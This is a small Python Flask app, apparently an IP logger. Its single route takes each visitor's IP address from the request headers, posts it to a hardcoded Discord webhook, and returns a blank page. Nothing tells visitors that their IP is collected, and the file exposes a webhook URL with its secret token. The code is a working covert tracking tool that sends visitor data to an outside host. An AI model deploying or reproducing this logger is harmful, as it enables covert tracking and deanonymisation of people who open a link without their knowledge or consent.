import os
from flask import Flask, request
import requests

app = Flask(__name__)

DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1355274305583452190/YFoPVpsJ6jFwXcBM6RJesckQFX8UFVB3hyZA9n3hrDozpy_2cN3p699vWZ408uF45-2j'  

def send_ip_to_discord(ip):
    payload = {
        'content': f'Logged IP: {ip}'
    }
    response = requests.post(DISCORD_WEBHOOK_URL, json=payload)

    if response.status_code == 200:
        print(f'pineapple pen')
    else:
        print(f'look what youve done {response.status_code}')

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    send_ip_to_discord(ip)
    return ''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 3000)))

